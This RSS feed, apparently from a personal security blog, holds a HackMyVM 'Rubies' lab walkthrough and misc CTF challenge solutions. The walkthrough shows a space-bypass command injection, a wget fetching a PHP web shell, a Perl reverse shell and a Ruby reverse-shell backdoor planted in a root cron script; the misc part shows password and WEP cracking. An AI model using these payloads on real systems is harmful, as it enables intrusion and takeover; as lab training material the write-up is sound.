<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Mon, 30 Dec 2024 15:52:15 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Mon, 30 Dec 2024 15:52:10 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[19.rubies]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. gitæ³„éœ²" data-href="#2.1. gitæ³„éœ²" href="https://www.c1trus.top/about:blank#2.1._gitæ³„éœ²" class="internal-link" target="_self" rel="noopener nofollow">2.1. gitæ³„éœ²</a>
<br><a data-tooltip-position="top" aria-label="2.2. æ–‡ä»¶ä¸Šä¼ " data-href="#2.2. æ–‡ä»¶ä¸Šä¼ " href="https://www.c1trus.top/about:blank#2.2._æ–‡ä»¶ä¸Šä¼ " class="internal-link" target="_self" rel="noopener nofollow">2.2. æ–‡ä»¶ä¸Šä¼ </a>


<br><a data-tooltip-position="top" aria-label="3. ä»£ç å®¡è®¡ RCEåˆ©ç”¨" data-href="#3. ä»£ç å®¡è®¡ RCEåˆ©ç”¨" href="https://www.c1trus.top/about:blank#3._ä»£ç å®¡è®¡_RCEåˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">3. ä»£ç å®¡è®¡ RCEåˆ©ç”¨</a>
<br><a data-tooltip-position="top" aria-label="4. ææƒ" data-href="#4. ææƒ" href="https://www.c1trus.top/about:blank#4._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒ</a>
<br><a data-tooltip-position="top" aria-label="5. gitå†åˆ©ç”¨" data-href="#5. gitå†åˆ©ç”¨" href="https://www.c1trus.top/about:blank#5._gitå†åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">5. gitå†åˆ©ç”¨</a>
<br><a data-tooltip-position="top" aria-label="6. å†ææƒroot" data-href="#6. å†ææƒroot" href="https://www.c1trus.top/about:blank#6._å†ææƒroot" class="internal-link" target="_self" rel="noopener nofollow">6. å†ææƒroot</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Rubies
<br>ä½œè€…ï¼š <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=ch4rm" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=ch4rm" target="_blank">ch4rm</a><br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šrubyæ“ä½œã€ç©ºæ ¼ç»•è¿‡ã€æ–‡ä»¶æ›¿æ¢ã€gitåˆ©ç”¨
<br><br>nmap -sC -sV -p- 192.168.56.12
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 19:34 CST
Nmap scan report for 192.168.56.12
Host is up (0.00023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 54:65:0b:7a:f3:5c:2f:1f:14:9e:bb:0e:44:0c:af:29 (RSA)
|   256 1f:5d:63:05:65:f7:cf:70:e4:0d:0a:45:80:77:50:2c (ECDSA)
|\_  256 69:a2:0f:83:dc:19:f2:c1:72:9c:a3:f8:09:44:3e:36 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|\_http-title: Cute Cat Only
|\_http-server-header: Apache/2.4.18 (Ubuntu)
| http-git:
|   192.168.56.12:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|\_    Last commit message: Why minnie?
MAC Address: 08:00:27:14:E7:BF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
<br>ä¸»é¡µ<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png" referrerpolicy="no-referrer"><br>è¿™é‡Œæœ‰ä¸¤ä¸ªæŒ‰é’® è¿˜æœ‰ä¸€ä¸ªnext ï¼Œnextä¼šæ˜¾ç¤ºä¸€äº›å…³äºçŒ«å’ªçš„æ•…äº‹<br>æ‰«ä¸‹ç›®å½•<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.002.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.003.png" referrerpolicy="no-referrer"><br>ä¸¤ä¸ªåˆ©ç”¨ç‚¹ï¼Œgitæ³„éœ²ä¸æ–‡ä»¶ä¸Šä¼ <br><br>python2 GitHack.py http://192.168.56.12/.git/
[+] Download and parse index file ...
bg/bg.gif
index.php
poems/poem1
poems/poem2
poems/poem3
poems/poem4
poems/poem5
uploads/cat1.gif
uploads/cat2.jpg
[OK] index.php
[Error] [Error 183] : u'192.168.56.12\\poems'
[Error] [Error 183] : u'192.168.56.12\\poems'
[OK] poems/poem1
[OK] poems/poem4
[OK] poems/poem5
[OK] uploads/cat2.jpg
[OK] poems/poem2
[OK] poems/poem3
[OK] uploads/cat1.gif
[OK] bg/bg.gif
<br>æ²¡å•¥ä¸œè¥¿<br><br>å‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ çš„æŒ‰é’® ä½†æ˜¯æ˜¯ç‚¹ä¸äº†çš„<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.004.png" referrerpolicy="no-referrer"><br>è¿™å¤šåŠæ˜¯æœ¬åœ°jsæ§åˆ¶çš„ ä¿®æ”¹ä¸€ä¸‹<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.005.png" referrerpolicy="no-referrer"><br>å°†disableåˆ æ‰<br>è¿™æ ·å°±å¯ä»¥ä¸Šä¼ æ–‡ä»¶äº†<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.006.png" referrerpolicy="no-referrer"><br>è¿™é‡Œæˆ‘ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å‘ç°ä¸åœ¨uploadsç›®å½•ä¸‹ï¼Œæˆ–è€…æ–‡ä»¶åå­—è¢«æ”¹æ‰äº†<br>è¿™é‡Œåˆ©ç”¨Githackè·å–ä¸€ä¸‹æ–‡ä»¶ç›®å½•ï¼Œçœ‹çœ‹æˆ‘çš„æ–‡ä»¶ä¸Šä¼ åˆ°å“ªé‡Œäº†<br>python2 GitHack.py http://192.168.56.12/.git/
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.007.png" referrerpolicy="no-referrer"><br> Upload functionality is currently disabled because Minnie messed up the code, lemme provide you with cute poems for the time being 
<br>ä¸Šä¼ åŠŸèƒ½ç›®å‰æš‚æ—¶æ— æ³•ä½¿ç”¨ï¼Œå› ä¸º Minnie æŠŠä»£ç å¼„åäº†ã€‚
è®©æˆ‘å…ˆä¸ºä½ æä¾›ä¸€äº›å¯çˆ±çš„è¯—å¥å§ï¼
<br>è·å–åˆ°ä¸€ä¸ªç”¨æˆ·åå­—<br>Minnie
<br><br>æ‰“å¼€index.phpï¼Œå®¡è®¡å‘ç°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªRceæ¼æ´<br> ç”¨dç›¾ä¹Ÿèƒ½æ‰«å‡ºæ¥<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.008.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.009.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.010.png" referrerpolicy="no-referrer"><br>å·®ä¸å¤šå°±æ˜¯è¿™æ ·<br>&lt;?php echo $input ?&gt;
<br>$inputæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚ä¼ å…¥å‚æ•°æ˜¯poem<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.011.png" referrerpolicy="no-referrer"><br>å°è¯•Rceå‘ç° æœ‰waf<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.012.png" referrerpolicy="no-referrer"><br>å†å›å»çœ‹ä¸‹ä»£ç <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.013.png" referrerpolicy="no-referrer"><br>è¿‡æ»¤äº†ç©ºæ ¼<br>è¿™ä¸ªç»•è¿‡ç”¨${IFS}å³å¯<br>è¿™é‡Œä¸å¤ªå¥½ç›´æ¥å¼¹shell<br>æˆ‘ä»¬å…ˆä¼ ä¸€ä¸ªç³»ç»Ÿé©¬ä¸Šå»<br>&lt;?php system($\_POST['cmd']);
echo "ok"?&gt;
<br>http://192.168.56.12/index.php?poem=;wget${IFS}http://192.168.56.6/shell.php
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.014.png" referrerpolicy="no-referrer"><br>ç„¶åå¼¹shell<br>cmd=perl%20-e%20'use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1122%3Bsocket(S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr\_in(%24p%2Cinet\_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B'
<br><br>ææƒæ£€æµ‹<br>(remote) www-data@rubies:/home/minnie$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/systemd-detect-virt = cap\_dac\_override,cap\_sys\_ptrace+ep
/usr/bin/traceroute6.iputils = cap\_net\_raw+ep
/usr/bin/mtr = cap\_net\_raw+ep

(remote) www-data@rubies:/var/www/html/uploads$ find / -perm -4000 2&gt;/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/at
/bin/ping
/bin/ping6
/bin/mount
/bin/fusermount
/bin/su
/bin/umount
<br>çœ‹ä¸‹ç”¨æˆ·ç›®å½•ä¸‹çš„æç¤º<br>(remote) www-data@rubies:/home/minnie$ cat note.txt
Put anything you'd like to in the folder,
do not do dumb stuff pls
<br>â€œå¯ä»¥æŠŠä»»ä½•ä½ æƒ³è¦çš„ä¸œè¥¿æ”¾è¿›è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œï¼Œ
è¯·ä¸è¦åšè ¢äº‹ï¼Œè°¢è°¢ã€‚â€
<br>æ„æ€æ˜¯æˆ‘ä»¬å¯ä»¥æ”¾ä»»ä½•ä¸œè¥¿åˆ°è¿™ä¸ªç›®å½•ä¸‹<br>é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æ”¾æˆ‘ä»¬çš„å…¬é’¥å‘¢<br>(remote) www-data@rubies:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Nov  2  2020 .
drwxr-xr-x 23 root root 4096 Nov  2  2020 ..
drwxr-xr-x  2 root root 4096 Nov  2  2020 minnie
<br>éª—å­å•Šã€‚æ²¡æœ‰å†™å…¥æƒé™<br>è¿˜æ˜¯çœ‹çœ‹ææƒå§<br>/usr/bin/systemd-detect-virt = cap\_dac\_override,cap\_sys\_ptrace+ep
/usr/bin/traceroute6.iputils = cap\_net\_raw+ep
/usr/bin/mtr = cap\_net\_raw+ep
<br>å¥½åƒæ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„<br><br>ä¹‹å‰åˆ©ç”¨githackè·å–åˆ°äº†å…¶ä¸­çš„Gitç›®å½•ä¸‹çš„ä¸€äº›æ–‡ä»¶<br>æŸ¥çœ‹å¤§ä½¬çš„wpå‘ç°è¿˜æœ‰ä¸ªGitToolså·¥å…·<br>åˆ©ç”¨è¿™ä¸ªå·¥å…·å¯ä»¥è·å–åˆ°åŒ…å«ä¸€äº›å‡­æ®çš„å†å²è®°å½•...<br>/home/gitTools-v0.0.1/Dumper/gitdumper.sh http://192.168.56.12/.git/ git
cd /home/gitTools-v0.0.1/Dumper/git/.git
 git show HEAD
commit 052a0cb4865e29bc03278105e0232b20173f933d (HEAD -&gt; master)
Author: Your Name &lt;root@rubies.com&gt;
Date:   Mon Nov 2 14:27:16 2020 +0800

    Why minnie?

diff --git a/index.php b/index.php
index 41f0f2f..d33ca0d 100644
--- a/index.php
+++ b/index.php
@@ -8,33 +8,6 @@ if(isset($\_GET['poem'])){
                $output = shell\_exec("cat poems/".$input);
        }
 }
-
-
-// we dont need a login page dangit minnie! follow my orders pls
-$servername = "localhost";
-$username = "root";
-$password = "jd92khn49w";
-
-$conn = new mysqli($servername, $username, $password);
-
-if ($conn-&gt;connect\_error) {
-  die("Connection failed: " . $conn-&gt;connect\_error);
-}
-
-$login\_username=$\_POST['username'];
-$login\_password=$\_POST['password'];
-
-$sql = "SELECT \* FROM users WHERE Username = '$login\_username' AND Password = '$login\_password' ";
-$result = mysqli\_query($con,$sql);
-
-if(sqmli\_num\_rows($result)&lt;1){i
-       $\_SESSION['login']=$user\_id;
-       header('Location: http://ch4rm.pw/dashboard');
-}
-else{
-       $error = True;
-}
-
 ?&gt;

 &lt;html&gt;
(END)
<br>è¿™é‡Œè·å–åˆ°ä¸€ä¸ªå¯†ç <br>jd92khn49w
<br>ç»è¿‡å°è¯•è¿™æ˜¯minnieç”¨æˆ·çš„å¯†ç <br><br>suåˆ°minnieåå‘ç°minnieç”¨æˆ·æ˜¯ä¸€ä¸ªRuby Interactive shell ï¼ˆirbï¼‰<br>ä½¿ç”¨å‘½ä»¤åˆ‡æ¢åˆ°ä¸€ä¸ªbash shell<br>system("bash")
<br>H0wc00l\_i5\_Byp@@s1n9
<br>ä¸Šé¢çš„å‡ ä¸ªææƒæ£€æµ‹æ²¡æœ‰ä¸œè¥¿<br>æˆ‘ä»¬ç”¨pspy64çœ‹ä¸€ä¸‹<br>2024/11/18 21:58:01 CMD: UID=0    PID=2681   | /bin/sh -c /usr/bin/ruby /root/bundle.rb
2024/11/18 21:58:01 CMD: UID=0    PID=2680   | /bin/sh -c /usr/bin/ruby /root/bundle.rb
2024/11/18 21:58:01 CMD: UID=0    PID=2679   | /usr/sbin/CRON -f
2024/11/18 21:58:01 CMD: UID=0    PID=2682   | /bin/sh /sbin/dhclient-script
2024/11/18 21:58:01 CMD: UID=0    PID=2687   | /bin/sh /sbin/resolvconf -a enp0s3.dhclient
2024/11/18 21:58:01 CMD: UID=0    PID=2685   | /bin/sh /sbin/resolvconf -a enp0s3.dhclient
2024/11/18 21:58:01 CMD: UID=0    PID=2693   | /usr/bin/ruby /root/bundle.rb
<br>å‘ç°å…¶æ¯éš”ä¸€æ®µæ—¶é—´ä¼šè¿è¡Œä¸€ä¸ªrubyçš„è„šæœ¬bundle.rb<br> /bin/sh -c /usr/bin/ruby /root/bundle.rb
<br>ä½†æ˜¯æˆ‘ä»¬å¥½åƒåŠæ³•æ§åˆ¶è¿™ä¸ªrubyè„šæœ¬<br>å†ç”¨linpeas.shæ£€æµ‹ä¸€ä¸‹<br>å‘ç°/opt/cleaningç›®å½•æ˜¯å±äºæˆ‘ä»¬å½“å‰ç”¨æˆ·ç»„çš„<br>è€Œä¸”è¿™ä¸ªç›®å½•ä¸‹é¢è¿˜æœ‰æ–‡ä»¶<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.015.png" referrerpolicy="no-referrer"><br>è¿™ä¸å¾—ä¸è®©æˆ‘æ„Ÿåˆ°æœ‰ç‚¹å¥½å¥‡äº†<br>è¿›ç›®å½•çœ‹ä¸€ä¸‹<br>ls -la
total 12
drwxrwxr-x 2 root minnie 4096 Nov  2  2020 .
drwxr-xr-x 3 root root   4096 Nov  2  2020 ..
-rw-r--r-- 1 root root    108 Nov  2  2020 webserver\_upload.rb
<br>ç›®å½•ä¸‹æœ‰ä¸€ä¸ª.rbè„šæœ¬<br>minnie@rubies:/opt/cleaning$ cat webserver\_upload.rb
require "find"

Find.find("/var/www/html/uploads/") do |file|
  File.delete("#{file}") if file=~/\.php/
end
<br>ä½œç”¨å°±æ˜¯åˆ æ‰æˆ‘ä»¬ç½‘ç«™uploadsç›®å½•é‡Œé¢æ‰€æœ‰çš„phpæ–‡ä»¶<br>çœ‹è¿™ä¸ªåŠŸèƒ½å°±å¤§æ¦‚å¯ä»¥çŒœæµ‹åˆ°è¿™ä¸ªæ–‡ä»¶è‚¯å®šç±»ä¼¼äºä¸€ä¸ªå®šæ—¶ä»»åŠ¡ä¼šæ¯éš”ä¸€æ®µæ—¶é—´å°±è¢«æ‰§è¡Œï¼Œåªæ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆpspy64æ²¡æœ‰æ£€æµ‹åˆ°<br>æ—¢ç„¶æˆ‘ä»¬è¿™ä¸ªç”¨æˆ·ç»„æœ‰è¿™ä¸ªç›®å½•çš„æƒé™<br>é‚£æˆ‘ä»¬å¯ä»¥æ›¿æ¢æ‰è¿™ä¸ªæ–‡ä»¶<br>å…ˆåˆ æ‰ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒåçš„rubyåé—¨<br>#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "192.168.56.6" 
#Set the Remote Host Port
PORT = "1234"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout\_and\_stderr |
              IO.copy\_stream(stdout\_and\_stderr, sock)
              end  
  end
rescue
  retry
end 
<br>å¼€å¯ç›‘å¬ç­‰å¾…ä¸€ä¼š æˆåŠŸåå¼¹shellææƒroot<br>å¾ˆç¦»è°±è¿™ä¸ªroot.txtå¯èƒ½æœ‰ä¸å¯è§å­—ç¬¦<br>ç›´æ¥è¯»å–ä¸äº†<br>cat \*root.txt\*
pyth0N&gt;r00bi35
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/19.rubies.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/19.rubies.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 14:54:39 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Drawing 2024-12-24 15.53.06]]></title><description><![CDATA[ 
 
  
  
  
    
    
  
  ]]></description><link>https://www.c1trus.top/excalidraw/drawing-2024-12-24-15.53.06.excalidraw.html</link><guid isPermaLink="false">Excalidraw/Drawing 2024-12-24 15.53.06.excalidraw.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 05:44:52 GMT</pubDate></item><item><title><![CDATA[Misc]]></title><description><![CDATA[ 
 <br><br>hashcatç ´è§£å°±è¡Œäº†<br>$6$xyz$ZGQOqL77wiYAgPxsNEv2Kz3INjzK4JdG29RbaHaW5lrkH8bA8W7kC3GK4CctGrFO7.E2va7kSgF3eQXNWYQee.:reddragon

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$xyz$ZGQOqL77wiYAgPxsNEv2Kz3INjzK4JdG29RbaHaW5lrk...WYQee.
Time.Started.....: Tue Dec 24 22:18:28 2024 (1 sec)
Time.Estimated...: Tue Dec 24 22:18:29 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    53686 H/s (14.63ms) @ Accel:1024 Loops:128 Thr:32 Vec:1
Speed.#2.........:      804 H/s (7.84ms) @ Accel:32 Loops:64 Thr:16 Vec:1
Speed.#*.........:    54490 H/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 32768/14344387 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 0/14344387 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4800-4864
Candidate.Engine.: Device Generator
Candidates.#1....: diego -&gt; keepout1
Candidates.#2....: 123456 -&gt; fuckyou1
Hardware.Mon.#1..: Temp: 51c Util: 99% Core:2535MHz Mem:8000MHz Bus:8
Hardware.Mon.#2..: N/A

HMV{reddragon}
<br><br>zip2john 008.zip
008.zip/flag.txt:$zip2$*0*3*0*751e06905814ebe63a63c72e8755d887*d807*e*25e3c7613e997071cd21a2163883*ba4cf18e59493b2515da*$/zip2$:flag.txt:008.zip:008.zip

john 008 --wordlist=/usr/share/wordlists/rockyou.txt
survivor         (008.zip/flag.txt)

HMV{cromiphi}

<br><br><img alt="assets/Pasted image 20241224225402.png" src="https://www.c1trus.top/24-æ¸—é€/hmv/challenges/assets/pasted-image-20241224225402.png"><br>
3-1è¡¨ç¤º 3å·é”®ç¬¬ä¸€ä¸ªå­—æ¯<br>$$$$$$$$$$ 
$_________$$ 
$_$$$$$$$_$$ 
$_$_____$_$$ 
$_$_____$_$$ 
$_$_____$_$$ 
$_$_____$_$$ 
$_$$$$$$$_$$ 
$_________$$ 
$$$$$$$$$$ 
$_________$$ 
$_1__2__3_$$$ 
$_4__5__6_$$$ 
$_7__8__9_$$$ 
$_*__0__#_$$$ 
$_________$$$ 
$$$$$$$$$$$ 
$$$$$$$$$ 
FLAG: 
HMV{?} 
? 
= 
3-1 D
2-1 A
8-1 T
2-1 A
7-4 S
3-2 E
2-3 C

HMV{DATASEC}
<br><br>echo -e "HMV{\033[31mw\033[31mh\033[31my\033[31m i\033[31mm \033[31mn\033[31mo\033[31mt \033[39m m\033[39ma\033[39my\033[39mb\033[39me \033[39mu\033[39ms\033[39me \033[32m g\033[32mr\033[32me\033[32me\033[32mn\033[32mt\033[32mh\033[32me\033[32mf\033[32ml\033[32ma\033[32mg\033[39m}"

HMV{greentheflag}

<br><br><a rel="noopener nofollow" class="external-link" href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html" target="_blank">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a><br>HMV{MORSEGIVESYOUTHEFLAG}
<br><br>HMV{gifarefun}
<br><br>åˆ©ç”¨ aircrack-ng çˆ†ç ´å³å¯<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/MISC]
â””â”€# aircrack-ng 033.pcap
Reading packets, please wait...
Opening 033.pcap
Read 71032 packets.

   #  BSSID              ESSID                     Encryption

   1  00:23:CD:1F:73:B0  WirelessLab               WEP (17314 IVs)

Choosing first network as target.

Reading packets, please wait...
Opening 033.pcap
Read 71032 packets.

1 potential targets

Attack will be restarted every 5000 captured ivs.

                                               Aircrack-ng 1.7


                                 [00:00:00] Tested 60016 keys (got 17273 IVs)

   KB    depth   byte(vote)
    0    0/  1   4D(28160) 24(23808) 58(23552) 44(22528) B7(22528) 94(21760) D2(21504) 00(20992)
    1    4/ 34   59(21760) E1(21504) 5B(21504) B0(20992) 56(20736) 98(20736) A6(20736) B4(20480)
    2   36/ 45   04(19712) 16(19456) 41(19456) 56(19456) 7B(19456) 7C(19456) 81(19456) E6(19456)
    3   14/ 40   45(20992) D3(20992) 94(20736) 04(20736) 0F(20480) 58(20480) B2(20480) 00(20480)
    4    0/  1   59(27648) 6F(23040) 25(22016) 20(21760) 38(21760) 30(21504) 53(21504) 67(21504)

                     KEY FOUND! [ 4D:59:4B:45:59 ] (ASCII: MYKEY )
        Decrypted correctly: 100%

HMV{MYKEY}
<br><br>eyå¼€å¤´ä¸€çœ¼jwt<br>
<img alt="assets/Pasted image 20241224233613.png" src="https://www.c1trus.top/24-æ¸—é€/hmv/challenges/assets/pasted-image-20241224233613.png"><br>HMV{DoNotStoreSensitiveDataHere}
<br><br><a rel="noopener nofollow" class="external-link" href="https://github.com/r3nt0n/keepass4brute" target="_blank">https://github.com/r3nt0n/keepass4brute</a><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/MISC]
â””â”€# bash /root/Desktop/tools/keepass4brute.sh Challenge.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 498/14344392 - Attempts per minute: 1358 - Estimated time remaining: 1 weeks, 0 days
[+] Current attempt: amigos

[*] Password found: amigos


HMV{EasyPeasyMoney}
<br><br>execelæ–‡ä»¶çš„æœ¬è´¨å°±æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…<br>
æˆ‘ä»¬å¯ä»¥è§£å‹åç”¨vscodeæ‰“å¼€<br>
å…¨å±€æœç´¢ flag æˆ–è€… hmv  æ²¡æœ‰æ‰¾åˆ°ã€‚é‚£å¤šåŠæ˜¯è—åœ¨äºŒè¿›åˆ¶æ–‡ä»¶é‡Œé¢äº†<br>strings .\vbaProject.bin

HMV{b63ce4efbf0b4214a470a707d34bc3ba}
<br><br>9950b5c66f8518f8b012359dc7390589 c03ec75734f58d87cddff35c57786429 e757e84e31ef68a74d86d6b52478654c HMV{c761d942cf5fe4ba9ece382739afef4e} 
<br>åˆ©ç”¨rockyouçˆ†ç ´å‡ºå‰3ä¸ªmd5<br>
å¯ä»¥å‘ç°å‰ä¸‰ä¸ªå¯ä»¥çˆ†ç ´å‡ºæ¥ï¼Œè€Œä¸”æ˜¯æœ‰è§„å¾‹çš„<br>
ç›´æ¥å¯¹ç¬¬å››çš„ä¸€ä¸ªè¿›è¡Œå“ˆå¸Œç¢°æ’<br>
<img alt="assets/Pasted image 20241225001025.png" src="https://www.c1trus.top/24-æ¸—é€/hmv/challenges/assets/pasted-image-20241225001025.png"><br>4doggy1
3mimis2
2wagon3
1lordp4
HMV{1lordp4}
<br><br><a rel="noopener nofollow" class="external-link" href="https://ncviewer.com/" target="_blank">https://ncviewer.com/</a><br>
<img alt="assets/QQ20241225-001850.png" src="https://www.c1trus.top/24-æ¸—é€/hmv/challenges/assets/qq20241225-001850.png"><br>HMV{engraving_a_trophy_for_Kerszi}
<br><br>ç”¨010æŸ¥çœ‹å‘ç°æ˜¯png<br>cybercheaf è§£å¯† ç”¨hexdumpä¸‹æ¥å³å¯<br>
<img alt="assets/Pasted image 20241225003154.png" src="https://www.c1trus.top/24-æ¸—é€/hmv/challenges/assets/pasted-image-20241225003154.png"><br>è§£å¯†åå›¾ç‰‡ä¸Šæœ‰ä¸€ä¸ªBase64ç¼–ç çš„flag<br>HMV{ancienttimes1880}
<br><br>HMV{ilikechinese}]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/challenges/misc.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/challenges/Misc.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://www.c1trus.top/24-æ¸—é€/hmv/challenges/assets/pasted-image-20241224225402.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-æ¸—é€/hmv/challenges/assets/pasted-image-20241224225402.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[49.otte]]></title><description><![CDATA[ 
 <br><br>
